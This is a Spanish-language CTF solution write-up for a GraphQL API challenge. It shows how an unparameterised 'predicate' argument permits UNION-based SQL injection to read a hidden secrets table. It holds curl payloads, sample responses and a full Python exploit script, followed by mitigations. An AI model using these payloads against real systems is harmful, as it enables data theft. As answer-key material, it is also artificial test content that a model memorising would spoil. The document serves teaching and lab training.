# Solución — api-datahub · DataHub Analytics API

**Categoría:** api
**Dificultad:** insane
**Puntos:** 500
**Vulnerabilidad:** GraphQL SQLi via directiva @filter (argumento `predicate`)

---

## Resumen ejecutivo

El campo `records` del tipo `Dataset` en la API GraphQL acepta un argumento
`predicate` que implementa la directiva `@filter` documentada internamente.
El valor del argumento **se interpola directamente en la query SQL sin
parametrizar**, permitiendo inyección SQL clásica.

Los errores SQL son suprimidos (respuesta vacía), lo que obliga a usar
técnicas **blind** o **UNION-based**. La tabla `secrets` —invisible en el
esquema GraphQL— contiene la flag bajo la clave `'flag'`.

---

## Cadena de explotación

```
1. Descubrir el esquema vía introspección GraphQL
       |
       v
2. Identificar el argumento `predicate` en el campo `records`
       |
       v
3. Confirmar inyección SQL (respuesta vacía = error SQL = vulnerable)
       |
       v
4. UNION injection para leer la tabla `secrets`
       |
       v
5. Extraer flag del campo `owner` en la respuesta
```

---

## Paso a paso

### 1. Reconocimiento inicial

```bash
curl -s http://<host>:5001/
```

Respuesta:
```json
{
  "api": "DataHub Analytics API",
  "version": "2.4.1",
  "graphql": "POST /graphql",
  "health": "GET /health",
  "note": "Enterprise data analytics platform. GraphQL API with @filter directive support."
}
```

La nota menciona "**@filter directive support**" — pista clave.

---

### 2. Introspección GraphQL

Enviar la query de introspección estándar para mapear el esquema completo:

```bash
curl -s -X POST http://<host>:5001/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name fields { name args { name description type { name } } } } } }"
  }' | python3 -m json.tool
```

En la salida, buscar el tipo `DatasetType` y el campo `records`:

```json
{
  "name": "records",
  "args": [
    {
      "name": "predicate",
      "description": "Implementa la directiva @filter interna. Filtra registros por propietario (owner). Uso: predicate: \"alice\"",
      "type": { "name": "String" }
    }
  ]
}
```

El argumento `predicate` (no `where`, no `filter`) es el vector de ataque.

---

### 3. Query normal — verificar funcionamiento

```bash
curl -s -X POST http://<host>:5001/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ dataset(id: \"1\") { name records { id data owner } } }"
  }'
```

Respuesta esperada:
```json
{
  "data": {
    "dataset": {
      "name": "Sales Q1 2024",
      "records": [
        {"id": "1", "data": "Revenue: $1.2M", "owner": "alice"},
        {"id": "2", "data": "Units: 45000",   "owner": "alice"},
        {"id": "3", "data": "Returns: 320",   "owner": "bob"}
      ]
    }
  }
}
```

---

### 4. Probar el filtro legítimo

```bash
curl -s -X POST http://<host>:5001/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ dataset(id: \"1\") { records(predicate: \"alice\") { data owner } } }"
  }'
```

Devuelve solo los registros donde `owner = '"'"'alice'"'"'`.

---

### 5. Probar inyección SQL (respuesta vacía = vulnerable)

El predicado se interpola como:
```sql
SELECT id, data, owner FROM records WHERE dataset_id=1 AND (owner = '<predicate>')
```

Romper la query con una comilla simple:

```bash
curl -s -X POST http://<host>:5001/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ dataset(id: \"1\") { records(predicate: \"'"'"'\") { data owner } } }"
  }'
```

Respuesta: `{"data": {"dataset": {"records": []}}}` — lista vacía.

Los errores SQL están suprimidos: **lista vacía = error SQL = inyección confirmada**.

---

### 6. UNION injection — extraer tabla secrets

La query vulnerable tiene 3 columnas: `id, data, owner`.
La tabla `secrets` tiene 2 columnas: `key, value`.
El payload añade un literal `1` como primera columna para cuadrar el UNION:

**Payload:**
```
' UNION SELECT 1, key, value FROM secrets--
```

Query SQL resultante:
```sql
SELECT id, data, owner FROM records WHERE dataset_id=1 AND (owner = '')
UNION SELECT 1, key, value FROM secrets--')
```

```bash
curl -s -X POST http://<host>:5001/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ dataset(id: \"1\") { records(predicate: \"'"'"' UNION SELECT 1, key, value FROM secrets--\") { id data owner } } }"
  }'
```

Respuesta:
```json
{
  "data": {
    "dataset": {
      "records": [
        {"id": "1", "data": "flag",       "owner": "HL4{...FLAG_AQUI...}"},
        {"id": "1", "data": "db_version", "owner": "3.41.2"}
      ]
    }
  }
}
```

La flag aparece en el campo **`owner`** del registro donde `data = "flag"`.

---

### 7. Script de explotación completo

```python
#!/usr/bin/env python3
"""exploit_api-datahub.py — UNION SQLi via GraphQL predicate argument."""
import json
import sys
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "172.30.99.30"
URL  = f"http://{HOST}:5001/graphql"

PAYLOAD = "' UNION SELECT 1, key, value FROM secrets--"

query = {
    "query": f"""{{
        dataset(id: "1") {{
            records(predicate: "{PAYLOAD}") {{
                id
                data
                owner
            }}
        }}
    }}"""
}

data = json.dumps(query).encode()
req  = urllib.request.Request(URL, data=data, headers={"Content-Type": "application/json"})
resp = urllib.request.urlopen(req, timeout=10)
body = json.loads(resp.read())

records = body["data"]["dataset"]["records"]
for rec in records:
    if rec["data"] == "flag":
        print(f"[+] FLAG: {rec['owner']}")
        break
else:
    print("[-] No se encontró la flag. Registros obtenidos:")
    print(json.dumps(records, indent=2))
```

Uso:
```bash
python3 exploit_api-datahub.py 172.30.<N>.30
```

---

## Por qué es INSANE

| Obstáculo | Descripción |
|---|---|
| Nombre del argumento | Se llama `predicate` (no `where`, `filter`, `condition`, `query`) — los scanners automáticos y la mayoría de herramientas no lo detectan |
| Errores silenciados | `except Exception: return []` — no hay mensaje de error SQL, fuerza técnica UNION o blind |
| Tabla oculta | `secrets` no aparece en el esquema GraphQL — hay que adivinarla o probar nombres comunes |
| Columnas desalineadas | `records` tiene 3 cols, `secrets` tiene 2 — UNION naive falla; hay que usar el literal `1` |
| Sin endpoint de docs | No hay `/docs`, `/swagger`, ni `/schema` expuesto directamente — solo introspección GraphQL |

---

## Mitigaciones

1. **Parametrizar siempre**: usar `cur.execute("... WHERE owner = ?", (predicate,))` en lugar de f-string.
2. **Lista blanca de valores**: si `predicate` solo puede ser un owner legítimo, validar contra un set conocido antes de la query.
3. **Deshabilitar introspección en producción**: evitar que atacantes descubran el esquema completo. En Graphene: `schema = graphene.Schema(query=Query, auto_camelcase=False)` con middleware que bloquee `__schema`/`__type`.
4. **ORM en lugar de SQL crudo**: usar SQLAlchemy u otro ORM que parametriza automáticamente.
5. **Tabla secrets separada**: en un sistema real, la flag/secretos estarían en un vault (Vault by HashiCorp, AWS Secrets Manager) inaccesible desde la misma conexión DB.

---

## Nota anti-trampas

- La flag es **por equipo** (`FLAG` inyectada en runtime por el flag-service).
- Cada equipo tiene su propio contenedor aislado en la red `172.30.<N>.30`.
- Intentar acceder a la IP de otro equipo está bloqueado por nftables.
- El SIEM detecta y loguea payloads con `UNION`/`SELECT` en el argumento `predicate`.
- Compartir la flag de otro equipo no da puntos — el sistema valida flag vs. team_id.
